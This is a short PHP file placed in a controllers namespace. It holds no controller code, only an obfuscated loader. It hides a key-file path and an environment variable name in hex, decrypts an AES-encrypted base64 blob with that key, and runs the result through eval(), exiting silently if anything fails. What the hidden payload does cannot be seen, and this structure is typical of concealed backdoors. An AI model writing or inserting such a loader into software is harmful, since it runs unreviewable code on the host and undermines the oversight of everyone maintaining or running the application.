<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('rynBJUAwAvHhS+V2UcsVFA==');

$c=base64_decode(

'bUZ63ml9Cu3cMKJ3UvD51yOHFrpiGFBB+fj8WhC4SCBkGQmkd7NoHLDETtrUwFP1CU1h8D4/lJNy' .
'Xft5dLu5agOKClhL+6h9AjeaoW48PMcxZccNvZZGlUxES2VXhwFEzwT4iL2H1bOC6fC6TIO3Uiy5' .
'jIofvuZVeXNB1mux1dhWjDqQzPzFfZzIjNcmNM/8XZoJrCHX0MZgxYTIFTydDRx+y/VhrdCyKTOW' .
'+SmiwbgBVzgOisd4IQ4oABZMRey8HYEV8FgKqHLGFm7O3+tDtg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

